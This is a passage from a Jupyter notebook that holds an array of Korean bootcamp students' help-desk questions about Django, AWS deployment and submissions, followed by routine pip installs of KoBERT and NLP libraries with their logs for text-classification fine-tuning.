FMA\\nTo enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.\\nSystem check identified no issues (0 silenced).\\nNovember 21, 2022 - 15:00:50\\nDjango version 3.2, using settings 'mysite.settings'\\nStarting development server at http://0:80/\\nQuit the server with CONTROL-C.\\nWatching for file changes with StatReloader\\nPerforming system checks...\\n\\n2022-11-21 15:02:38.328258: I tensorflow/core/platform/cpu_feature_guard.cc:193] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA\\nTo enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.\\nSystem check identified no issues (0 silenced).\\nNovember 21, 2022 - 15:02:40\\nDjango version 3.2, using settings 'mysite.settings'\\nStarting development server at http://0:80/\\nQuit the server with CONTROL-C.\\nWatching for file changes with StatReloader\\nPerforming system checks...\\n\\n2022-11-21 15:07:37.817232: I tensorflow/core/platform/cpu_feature_guard.cc:193] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA\\nTo enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.\\nSystem check identified no issues (0 silenced).\\nNovember 21, 2022 - 15:07:39\\nDjango version 3.2, using settings 'mysite.settings'\\nStarting development server at http://0:80/\\nQuit the server with CONTROL-C.\\n\\n이렇게 결과가 나옵니다\",\n","       'putty에서 실습 중인데 설치랑 디렉토리 문제가 없어보이는데 해당 오류가 발생하였습니다.\\n혹시 원인을 알 수 있을까요?',\n","       '답변 감사합니다!\\n혹시 ipynb코드는 어떤 코드 제출인지 알 수 있을까요?\\nview.py를 내는건가요??\\n웹 소스코드는 http://35.86.144.223/signlanguage/이걸 적으면 되나요??',\n","       'runserver가 안되는 거 같아요 업로드가 안뜹니다,,',\n","       'ipynb 파일을 첨부하지 않고 제출하기를 눌러버렸습니다. 첨부하고 싶은데 안되는 거 같습니다. 어떻게 제출할 수 있을까요?',\n","       \"nohup sudo /home/ubuntu/anaconda3/bin/python manage.py runserver 0:80 하면\\n\\nnohup: ignoring input and appending output to 'nohup.out'\\n라 나오는데 계속 이상태로 있습니다.\\n교안에 있던것처럼 명령창이 안나옵니다\",\n","       '2. aws에서 발급받은 ip 주소로 웹 사이트를 제작하면 사이트의 운영기간이 무한한가요??',\n","       '안녕하십니까.\\n빅프로젝트 관련하여 문의드립니다.\\n빅프로젝트 수행 시 공공데이터 사용이 필수인지 궁금합니다.\\n배달 리뷰 데이터를 크롤링하여 분석하여 배달의 민족과 요기요와 같은 배달앱에\\n제 3자 고객대응 시스템을 제안하는 것이 주제입니다.\\n\\n감사합니다.\\n좋은 하루 되십시오 ^^',\n","       '안녕하세요 colab에서 model.h5 파일을 업로드하는데 계속 디렉토리 오류가 발생합니다. \\ntensorflow 나 load_model 외에 다른 것을 import 해야하는건가요? \\n이러한 경우 어떻게 해결해야하나요?\\n\\n감사합니다.',\n","       '답변해주신 방법으로 재실행해봤는데도 다음 줄로 넘어가 버립니다.\\n\\n--noreload 경우엔\\nzsh: illegal hardware instruction  python manage.py runserver --noreload 라고 뜹니다,.,.',\n","       '안녕하세요.\\n\\nrequests.File 에 여러 파일을 담을 수 없는 것 같습니다. 만약 그렇다면 차례대로 파일을 업로드 하기 위해서는 어떤 방법을 사용해야 할까요?\\n\\n강사님이 보여주셨던 화면처럼 하나씩 계속 업로드 하려면 html 파일에서 원하는 만큼 form을 반복시켜야 할 것 같은데, {{for}} 또는 {{if}}문으로 form을 반복시킬 수 있을까요?\\n\\n어떻게 해야 할지 감이 안 잡혀서 질문 드립니다.\\n\\n감사합니다.',\n","       'url runserver 할 때, putty로 연결해서 하는게 아니라\\n그냥 cmd창으로 하는게 맞나요?\\nputty로 연결해서 제가 첨부한 사진처럼 하면 \\nhttp://127.0.0.1:8000/signlanguage/ \u0026lt;- url 입력했을 때\\n사이트 연결을 못합니다ㅜㅜ',\n","       'deeycopy로 동적으로 이미지업로드를 생성했는데 upload하는 과정에서 마지막 context만 저장이되는데 배열객체로 저장해서 render할때 모두 불러오는것인가요?',\n","       '\"-올린 모델 중에서 active된 모델을 view에서 쓰게 끔 연동\" 과정을 진행 중입니다.\\nmodels.py에서 만든 class Model  하위의 models.Filefield로 딥러닝 모델을 받고 있습니다.\\n해당 과정 쿼리에서 models.Filefield가 어떤 값으로 들어가는 지 어떻게 확인할 수 있을까요?\\n',\n","       'settings.py에 signlanguage를 추가한 부분입니다.\\n\\n팀원과 해결했습니다 감사합니다!',\n","       '같은 내용으로 여쭈어 봐서 죄송합니다....\\n\\nhtml에서 작성하는 방법을 보고 작성을 해봤는데\\n\\n첨부 이미지 와 같이 answer, image, result 값이 전부 리스트의 형태를 하고 있다고 했을 때를 생각해서 작성을 했는데\\n위와 같이 html 문을 끝내고 view에서 작성을 이어가도 될까요?\\n\\n# count는 view에서 result를 구할때 모델을 돌릴때마다 증가시켜 주는 값으로 생각했습니다.',\n","       '올려주신 파일(소스2=최종파일) 그대로 로컬호스트에서 실행해보려 했는데\\n1. 실행중이던 장고(웹에 띄운 http://127.~ 같은 창들)를 모두 끄고\\n2. makemigrations 부터 시도했는데\\n여전히 같은 오류가 납니다.\\n원인이 뭔지, 원인을 어떻게 해야 찾을 수 있는지 알려주시면 감사하겠습니다.\\n\\n\\n\\n\\n\\n\\n\\nvscode 터미널에 \\npython manage.py makemigrations\\npython manage.py migrate\\npython manage.py runserver\\n등등 이런 명령어를 넣으면 사진과 같이 오류가 쭉 나오다가  \\n\\n  File \"C:\\\\Users\\\\User\\\\AppData\\\\Roaming\\\\Python\\\\Python311\\\\site-packages\\\\tensorflow\\\\python\\\\pywrap_tensorflow_internal.py\", line 114\\n    def TFE_ContextOptionsSetAsync(arg1, async):\\n                                         ^^^^^\\nSyntaxError: invalid syntax\\n\\n마지막엔 이런 식으로 나오는 건 어떤 식으로 고쳐야 하는지, !!원인이 무엇인지!! 알려주시면 감사하겠습니다.',\n","       '안녕하세요\\nadmin 사이트 접속이 admin/django123 이 갑자기 안되서 변경할수 있는 방법이나 그외의 방법이 있을까요???',\n","       '이미지를 여러개 업로드 하게 되면 해당 이미지들을 모두 Result테이블에 image 칼럼에 전부 넣어야 하는건가요? 아니면 따로 테이블로 관리해야하는 걸까요?\\n강사님은 다른 ai 테이블 과result말고는 없던거 같아서요 그냥 그대로 진행해도 괜찮을까요?\\n ',\n","       '네.. addFiles() 함수에서 일어난 문제입니다 ㅜㅜ\\n\\n파일 추가 버튼을 계속 눌러도 두번째 사진처럼 뜹니다\\n(두번째 사진은 a 이미지 업로드 이후에 e 이미지 업로드 하고 파일 추가 버튼 누른 상태입니다.)',\n","       '이미지 여러개 받는 것도\\nsubmit 버튼 누르면 view 함수에 데이터가 자동으로 들어가나요..?!',\n","       '이미지 복수 업로드 및 출력까지 완료하였습니다.\\n이제 admin에서 모델 선택을 하면 되는건가요...?',\n","       '어드민 페이지에 내용을 수정하고 검색기능 만들고는 구현을 했는데 templates를 오버라이딩 해와서 원하는 Aimodel 쪽 안에서 보여주는거에서 너무 꽉 막혔습니다.. 참고 자료를 봐도 파일 트리 구성도가 이해가 안가는데 어떤식으로 만들어서 하면 되는것인지 설명 한번 부탁드립니다 ㅠㅠ ----\u0026gt;\u0026gt;\u0026gt;해결했습니다',\n","       '안녕하세요. \\n\\n로컬 환경에서는 그래프가 잘 표시되지만\\n\\naws 에 올려서는 그래프가 표시되지 않는 문제가 있습니다.\\n\\n그래프는 admin 페이지에서 보여지는 그래프이고 구글 차트를 이용했습니다.\\n\\naws 서버에서 동작하면 https://www.gstatic.com/charts/loader.js가 포함된 부분이 아예 실행되지 않는 것 같습니다\\n\\n어떻게 해결하면 좋을까요?\\n\\n감사합니다.',\n","       '발표자료를 17시까지 제출해야한다고 하셨는데 정확히 어떤 산출물들이 들어가야하는지 모르겠습니다.\\n스크립트까지 포함해야하는지 등 정확한 제출물 안내 부탁드리겠습니다. 감사합니다.',\n","       '구현한 파일을 AWS 생성해서 배포해야하는지 문의드립니다~',\n","       '안녕하세요! \\n\\n이번 실습에서 제안사 현황 소개 부분에는 회사 소개와 주력 사업 등 간단하게 소개하는 느낌으로\\n스크립트를 짜도 될까요 ?? \\n\\n\\n그리고 저희 최종 조별 산출물에 조원 모두의 스크립트 부분도 붙여서 넣으면 되나요 ?\\n\\n감사합니다.',\n","       '안녕하세요!\\n저희 산출물 ppt파일 6페이지 예상질문 부분에 \\n항목을 저희 목차에 바꿔서 거기에 대한 예상질문을 하나씩 작성해서 적는게 맞을까요 ??\\n\\n아니면 산출물에 적혀있는 항목에 따른 질문을 만들어서 써야하나요 ?\\n\\n감사합니다.',\n","       '웹 배포 중 우분투 안에서 runserver을 실행해 http://0:80/이 떠서 \\n제 ip주소인 18.179.16.148인 \\nhttps://18.179.16.148/sign_lang으로 했는데 사이트에 연결할수없다고 뜹니다.',\n","       \"직접 촬영한 수어 이미지를 로컬에서 테스트 하려니 에러가 뜹니다\\n경로 위치 다 영어 경로이며 웹 코드내에 있는 media 파일 안에 없다고 뜹니다\\nmedia 파일을 확인 해보니 테스트 할 때 사용된 이미지들이 28/28로 줄여진 이미지들이 저장 되어 있었습니다\\n그런데 직접 촬영한 사진은 아래와 같은 에러만 뜹니다\\n[Errno 2] No such file or directory: 'C:\\\\\\\\Users\\\\\\\\User\\\\\\\\Downloads\\\\\\\\mini7\\\\\\\\aivle-sign-language--\\\\\\\\media\\\\\\\\test_sign.jpg'\",\n","       '이번 미니프로젝트에서 https가 꼭 필요한 Webcam을 탑재하였는데, 인증서 아무렇게 만들고 443포트로 django-sslserver를 여니까 사이트 접속시 경고가 뜨기는 하지만 amazon으로 배포된 서버에서 돌아가는것을 확인하였습니다. 미리 만들어둔 기능이 아까운데, 그래도 https는 사용하면 안되는걸까요?',\n","       '이번미니프로젝트 제출이 3개인걸로아는데\\naws 주소는 사진업로드하는 url 제출하면되는걸까요?\\n소스코드는 제가 아까 제출하지 말라고 얼핏듣은거 같은데 맞나요?\\naws 주소,소스코드,ppt 3개 압축해서 \\n압축파일에 적을 이름 양식은 어떻게 될까요??\\nEX) 미니프로젝트_7차_전남전북_21조',\n","       '조별과제의 경우 PT 녹화 영상을 올리는 것으로,\\n개인과제의 경우 개인 스크립트, 질의응답을 올리는 것으로 알고 있는데요.\\n\\n인지하고 있는 내용이 맞는지 확인 및 안내 부탁드립니다.',\n","       '아직 녹화 본이 안떠서 연습 영상으로 제출했습니다..\\n다시 제출할 수 있을까요?\\n가능하다면 언제까지 제출하면 될까요?',\n","       '오늘 자정까지 제출인 줄 알고 늦었습니다..\\n혹시 몰라서 이렇게라도 늦은 제출 해봅니다\\n죄송합니다.',\n","       '솔루션 개요서 마지막날 시간을 5시가 아닌 24시로 착각해서 제출을 못했는데 이러한 경우 어떻게 해야하나요?',\n","       '1대1 게시판에 내라고 하셔서 제출합니다.!',\n","       '1주차 산출물에 데이터셋이 있습니다. 각각의 데이터 셋을 제출해야 하는 건지, 한번에 통합하고 정제된 데이터를 제출 해야 하는지 여쭤봅니다. ',\n","       '안녕하세요 \\n코딩테스트 결과 확인 못한 경우 1:1 문의로 \\n확인 가능하다고 공지 받아 문의 드립니다.\\n감사합니다! ',\n","       '듀얼 모니터로 진행해도 되나요?', 'aice특강 ppt는 따로 안올려주시나요?',\n","       '안녕하세요~!\\n실습 중 궁금한 점이 있어 문의 드립니다. \\n\\n1. 라벨 인코더\\n라벨 인코더는 첨부드린 파일과 같이 코드를 실행했을 때\\n경고 메시지가 나오기는 하지만 데이터 프레임에 적용이 잘 되어 나타납니다. \\n혹시 경고 메시지없이 \\n라벨 인코더 변환 후 원래 데이터 프레임에 적용하는 방법이 있을까요~?',\n","       '안녕하세요.\\nkT AIDU에서 전에 Associate 시험에 대해 공부할 수 있는 프로젝트가 없어져서 그러는데 다시 올려주실 수는 없으신가요.? 공부하고 싶습니다!\\n\\n감사합니다.!',\n","       'app 마다 urls.py 을 만들어서 관리하는게 더 좋은 코드인가요?\\n아니면 setting.py 있는 메인 앱에 다 임포트 해줘서 한 urls.py로 관리해주는게 좋은 코드인가요??\\n',\n","       '안녕하세요\\n현재 aidu에서 테스트를 진행중입니다, 버전문제로 파이썬 3.6에서 3.7로 업그레이드를 하고싶은데\\n\"ERROR: Could not find a version that satisfies the requirement python==3.7 (from versions: none)\\nERROR: No matching distribution found for python==3.7\"\\n해당 에러로 업그레이드를 진행할 수 없습니다.\\naidu 환경에서 파이썬 버전 업그레이드 방법을 알려주시면 감사하겠습니다.'],\n","      dtype=object)"]},"execution_count":48,"metadata":{},"output_type":"execute_result"}],"source":["test"]},{"cell_type":"code","execution_count":null,"metadata":{"id":"hbQ1JoRYocKq"},"outputs":[],"source":["y_test = y_test.tolist()"]},{"cell_type":"code","execution_count":null,"metadata":{"id":"TGt3umvk7G9X"},"outputs":[],"source":["# train.columns=['text','label']\n","# test.columns=['text','label']"]},{"cell_type":"code","execution_count":null,"metadata":{"id":"OZXIeYIg72Iq"},"outputs":[],"source":["# train['label']=train['label'].astype('int')\n","# test['label']=test['label'].astype('int')"]},{"cell_type":"markdown","metadata":{"id":"_U8FlckFQYTZ"},"source":["## 5. Using pre-trained model(Optional)\n","* 한국어 pre-trained model로 fine tuning 및 성능 분석\n","\u003e * [BERT-tutorial](https://www.tensorflow.org/text/guide/bert_preprocessing_guide)\n","\u003e * [HuggingFace-Korean](https://huggingface.co/models?language=korean)"]},{"cell_type":"code","execution_count":20,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":34854,"status":"ok","timestamp":1680841284247,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"veNUbGynNdAd","outputId":"62bd39c9-9113-48d6-dd60-4748fb39ba53"},"outputs":[{"name":"stdout","output_type":"stream","text":["Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n","Collecting mxnet\n","  Downloading mxnet-1.9.1-py3-none-manylinux2014_x86_64.whl (49.1 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m49.1/49.1 MB\u001b[0m \u001b[31m17.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hRequirement already satisfied: numpy\u003c2.0.0,\u003e1.16.0 in /usr/local/lib/python3.9/dist-packages (from mxnet) (1.22.4)\n","Requirement already satisfied: requests\u003c3,\u003e=2.20.0 in /usr/local/lib/python3.9/dist-packages (from mxnet) (2.27.1)\n","Collecting graphviz\u003c0.9.0,\u003e=0.8.1\n","  Downloading graphviz-0.8.4-py2.py3-none-any.whl (16 kB)\n","Requirement already satisfied: urllib3\u003c1.27,\u003e=1.21.1 in /usr/local/lib/python3.9/dist-packages (from requests\u003c3,\u003e=2.20.0-\u003emxnet) (1.26.15)\n","Requirement already satisfied: idna\u003c4,\u003e=2.5 in /usr/local/lib/python3.9/dist-packages (from requests\u003c3,\u003e=2.20.0-\u003emxnet) (3.4)\n","Requirement already satisfied: charset-normalizer~=2.0.0 in /usr/local/lib/python3.9/dist-packages (from requests\u003c3,\u003e=2.20.0-\u003emxnet) (2.0.12)\n","Requirement already satisfied: certifi\u003e=2017.4.17 in /usr/local/lib/python3.9/dist-packages (from requests\u003c3,\u003e=2.20.0-\u003emxnet) (2022.12.7)\n","Installing collected packages: graphviz, mxnet\n","  Attempting uninstall: graphviz\n","    Found existing installation: graphviz 0.20.1\n","    Uninstalling graphviz-0.20.1:\n","      Successfully uninstalled graphviz-0.20.1\n","Successfully installed graphviz-0.8.4 mxnet-1.9.1\n","Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n","Collecting gluonnlp\n","  Downloading gluonnlp-0.10.0.tar.gz (344 kB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m344.5/344.5 KB\u001b[0m \u001b[31m24.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25h  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n","Requirement already satisfied: pandas in /usr/local/lib/python3.9/dist-packages (1.4.4)\n","Requirement already satisfied: tqdm in /usr/local/lib/python3.9/dist-packages (4.65.0)\n","Requirement already satisfied: numpy\u003e=1.16.0 in /usr/local/lib/python3.9/dist-packages (from gluonnlp) (1.22.4)\n","Requirement already satisfied: cython in /usr/local/lib/python3.9/dist-packages (from gluonnlp) (0.29.34)\n","Requirement already satisfied: packaging in /usr/local/lib/python3.9/dist-packages (from gluonnlp) (23.0)\n","Requirement already satisfied: python-dateutil\u003e=2.8.1 in /usr/local/lib/python3.9/dist-packages (from pandas) (2.8.2)\n","Requirement already satisfied: pytz\u003e=2020.1 in /usr/local/lib/python3.9/dist-packages (from pandas) (2022.7.1)\n","Requirement already satisfied: six\u003e=1.5 in /usr/local/lib/python3.9/dist-packages (from python-dateutil\u003e=2.8.1-\u003epandas) (1.16.0)\n","Building wheels for collected packages: gluonnlp\n","  Building wheel for gluonnlp (setup.py) ... \u001b[?25l\u001b[?25hdone\n","  Created wheel for gluonnlp: filename=gluonnlp-0.10.0-cp39-cp39-linux_x86_64.whl size=680544 sha256=99437920312c3a06d8feaf7a3069544b4725039b850e5c427e5fcf345878d3fe\n","  Stored in directory: /root/.cache/pip/wheels/47/17/70/b257bc53879a458c4bfcc900e89271aa8b4f19366a54bd2455\n","Successfully built gluonnlp\n","Installing collected packages: gluonnlp\n","Successfully installed gluonnlp-0.10.0\n","Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n","Collecting sentencepiece\n","  Downloading sentencepiece-0.1.97-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (1.3 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m1.3/1.3 MB\u001b[0m \u001b[31m50.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hInstalling collected packages: sentencepiece\n","Successfully installed sentencepiece-0.1.97\n","Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n","Collecting transformers==4.0.0\n","  Downloading transformers-4.0.0-py3-none-any.whl (1.4 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m1.4/1.4 MB\u001b[0m \u001b[31m61.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hRequirement already satisfied: tqdm\u003e=4.27 in /usr/local/lib/python3.9/dist-packages (from transformers==4.0.0) (4.65.0)\n","Requirement already satisfied: filelock in /usr/local/lib/python3.9/dist-packages (from transformers==4.0.0) (3.10.7)\n","Requirement already satisfied: packaging in /usr/local/lib/python3.9/dist-packages (from transformers==4.0.0) (23.0)\n","Requirement already satisfied: numpy in /usr/local/lib/python3.9/dist-packages (from transformers==4.0.0) (1.22.4)\n","Collecting sacremoses\n","  Downloading sacremoses-0.0.53.tar.gz (880 kB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m880.6/880.6 KB\u001b[0m \u001b[31m66.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25h  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n","Collecting tokenizers==0.9.4\n","  Downloading tokenizers-0.9.4-cp39-cp39-manylinux2010_x86_64.whl (2.9 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.9/2.9 MB\u001b[0m \u001b[31m88.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hRequirement already satisfied: requests in /usr/local/lib/python3.9/dist-packages (from transformers==4.0.0) (2.27.1)\n","Requirement already satisfied: regex!=2019.12.17 in /usr/local/lib/python3.9/dist-packages (from transformers==4.0.0) (2022.10.31)\n","Requirement already satisfied: charset-normalizer~=2.0.0 in /usr/local/lib/python3.9/dist-packages (from requests-\u003etransformers==4.0.0) (2.0.12)\n","Requirement already satisfied: idna\u003c4,\u003e=2.5 in /usr/local/lib/python3.9/dist-packages (from requests-\u003etransformers==4.0.0) (3.4)\n","Requirement already satisfied: certifi\u003e=2017.4.17 in /usr/local/lib/python3.9/dist-packages (from requests-\u003etransformers==4.0.0) (2022.12.7)\n","Requirement already satisfied: urllib3\u003c1.27,\u003e=1.21.1 in /usr/local/lib/python3.9/dist-packages (from requests-\u003etransformers==4.0.0) (1.26.15)\n","Requirement already satisfied: six in /usr/local/lib/python3.9/dist-packages (from sacremoses-\u003etransformers==4.0.0) (1.16.0)\n","Requirement already satisfied: click in /usr/local/lib/python3.9/dist-packages (from sacremoses-\u003etransformers==4.0.0) (8.1.3)\n","Requirement already satisfied: joblib in /usr/local/lib/python3.9/dist-packages (from sacremoses-\u003etransformers==4.0.0) (1.1.1)\n","Building wheels for collected packages: sacremoses\n","  Building wheel for sacremoses (setup.py) ... \u001b[?25l\u001b[?25hdone\n","  Created wheel for sacremoses: filename=sacremoses-0.0.53-py3-none-any.whl size=895259 sha256=054fdbab67986403d55bf27a732465956dd48953229f58892dd63e3c75e65ac8\n","  Stored in directory: /root/.cache/pip/wheels/12/1c/3d/46cf06718d63a32ff798a89594b61e7f345ab6b36d909ce033\n","Successfully built sacremoses\n","Installing collected packages: tokenizers, sacremoses, transformers\n","Successfully installed sacremoses-0.0.53 tokenizers-0.9.4 transformers-4.0.0\n","Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n","Requirement already satisfied: torch in /usr/local/lib/python3.9/dist-packages (2.0.0+cu118)\n","Requirement already satisfied: triton==2.0.0 in /usr/local/lib/python3.9/dist-packages (from torch) (2.0.0)\n","Requirement already satisfied: networkx in /usr/local/lib/python3.9/dist-packages (from torch) (3.0)\n","Requirement already satisfied: sympy in /usr/local/lib/python3.9/dist-packages (from torch) (1.11.1)\n","Requirement already satisfied: jinja2 in /usr/local/lib/python3.9/dist-packages (from torch) (3.1.2)\n","Requirement already satisfied: filelock in /usr/local/lib/python3.9/dist-packages (from torch) (3.10.7)\n","Requirement already satisfied: typing-extensions in /usr/local/lib/python3.9/dist-packages (from torch) (4.5.0)\n","Requirement already satisfied: lit in /usr/local/lib/python3.9/dist-packages (from triton==2.0.0-\u003etorch) (16.0.0)\n","Requirement already satisfied: cmake in /usr/local/lib/python3.9/dist-packages (from triton==2.0.0-\u003etorch) (3.25.2)\n","Requirement already satisfied: MarkupSafe\u003e=2.0 in /usr/local/lib/python3.9/dist-packages (from jinja2-\u003etorch) (2.1.2)\n","Requirement already satisfied: mpmath\u003e=0.19 in /usr/local/lib/python3.9/dist-packages (from sympy-\u003etorch) (1.3.0)\n"]}],"source":["# MXNet은 딥러닝 프레임워크 \n","# GluonNLP는 MXNet 기반 자연어 처리 라이브러리\n","# SentencePiece는 토크나이저 라이브러리\n","# Transformers는 딥 러닝 라이브러리, \n","# 다양한 자연어 처리 작업을 위한 사전 학습된 모델과 모델 구성을 제공\n","\n","!pip install mxnet\n","!pip install gluonnlp pandas tqdm\n","!pip install sentencepiece\n","!pip install transformers==4.0.0\n","!pip install torch"]},{"cell_type":"code","execution_count":21,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":82812,"status":"ok","timestamp":1680841367055,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"p0D8du4-zrMU","outputId":"f7ef43ca-25bb-4233-cc7b-fd23261e4f35"},"outputs":[{"name":"stdout","output_type":"stream","text":["Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n","Collecting git+https://****@github.com/SKTBrain/KoBERT.git@master\n","  Cloning https://****@github.com/SKTBrain/KoBERT.git (to revision master) to /tmp/pip-req-build-4h9zk0gb\n","  Running command git clone --filter=blob:none --quiet 'https://****@github.com/SKTBrain/KoBERT.git' /tmp/pip-req-build-4h9zk0gb\n","  Resolved https://****@github.com/SKTBrain/KoBERT.git to commit 47a69af87928fc24e20f571fe10c3cc9dd9af9a3\n","  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n","Collecting boto3\u003c=1.15.18\n","  Downloading boto3-1.15.18-py2.py3-none-any.whl (129 kB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m129.1/129.1 KB\u001b[0m \u001b[31m14.4 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hRequirement already satisfied: gluonnlp\u003c=0.10.0,\u003e=0.6.0 in /usr/local/lib/python3.9/dist-packages (from kobert==0.2.3) (0.10.0)\n","Collecting mxnet\u003c=1.7.0.post2,\u003e=1.4.0\n","  Downloading mxnet-1.7.0.post2-py2.py3-none-manylinux2014_x86_64.whl (54.7 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m54.7/54.7 MB\u001b[0m \u001b[31m18.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hCollecting onnxruntime\u003c=1.8.0,==1.8.0\n","  Downloading onnxruntime-1.8.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (4.5 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m4.5/4.5 MB\u001b[0m \u001b[31m79.8 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hCollecting sentencepiece\u003c=0.1.96,\u003e=0.1.6\n","  Downloading sentencepiece-0.1.96-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (1.2 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m1.2/1.2 MB\u001b[0m \u001b[31m62.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hCollecting torch\u003c=1.10.1,\u003e=1.7.0\n","  Downloading torch-1.10.1-cp39-cp39-manylinux1_x86_64.whl (881.9 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m881.9/881.9 MB\u001b[0m \u001b[31m2.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hCollecting transformers\u003c=4.8.1,\u003e=4.8.1\n","  Downloading transformers-4.8.1-py3-none-any.whl (2.5 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.5/2.5 MB\u001b[0m \u001b[31m93.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hRequirement already satisfied: flatbuffers in /usr/local/lib/python3.9/dist-packages (from onnxruntime\u003c=1.8.0,==1.8.0-\u003ekobert==0.2.3) (23.3.3)\n","Requirement already satisfied: numpy\u003e=1.16.6 in /usr/local/lib/python3.9/dist-packages (from onnxruntime\u003c=1.8.0,==1.8.0-\u003ekobert==0.2.3) (1.22.4)\n","Requirement already satisfied: protobuf in /usr/local/lib/python3.9/dist-packages (from onnxruntime\u003c=1.8.0,==1.8.0-\u003ekobert==0.2.3) (3.20.3)\n","Collecting jmespath\u003c1.0.0,\u003e=0.7.1\n","  Downloading jmespath-0.10.0-py2.py3-none-any.whl (24 kB)\n","Collecting s3transfer\u003c0.4.0,\u003e=0.3.0\n","  Downloading s3transfer-0.3.7-py2.py3-none-any.whl (73 kB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m73.4/73.4 KB\u001b[0m \u001b[31m11.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hCollecting botocore\u003c1.19.0,\u003e=1.18.18\n","  Downloading botocore-1.18.18-py2.py3-none-any.whl (6.7 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m6.7/6.7 MB\u001b[0m \u001b[31m110.4 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hRequirement already satisfied: cython in /usr/local/lib/python3.9/dist-packages (from gluonnlp\u003c=0.10.0,\u003e=0.6.0-\u003ekobert==0.2.3) (0.29.34)\n","Requirement already satisfied: packaging in /usr/local/lib/python3.9/dist-packages (from gluonnlp\u003c=0.10.0,\u003e=0.6.0-\u003ekobert==0.2.3) (23.0)\n","Requirement already satisfied: requests\u003c3,\u003e=2.20.0 in /usr/local/lib/python3.9/dist-packages (from mxnet\u003c=1.7.0.post2,\u003e=1.4.0-\u003ekobert==0.2.3) (2.27.1)\n","Requirement already satisfied: graphviz\u003c0.9.0,\u003e=0.8.1 in /usr/local/lib/python3.9/dist-packages (from mxnet\u003c=1.7.0.post2,\u003e=1.4.0-\u003ekobert==0.2.3) (0.8.4)\n","Requirement already satisfied: typing-extensions in /usr/local/lib/python3.9/dist-packages (from torch\u003c=1.10.1,\u003e=1.7.0-\u003ekobert==0.2.3) (4.5.0)\n","Requirement already satisfied: filelock in /usr/local/lib/python3.9/dist-packages 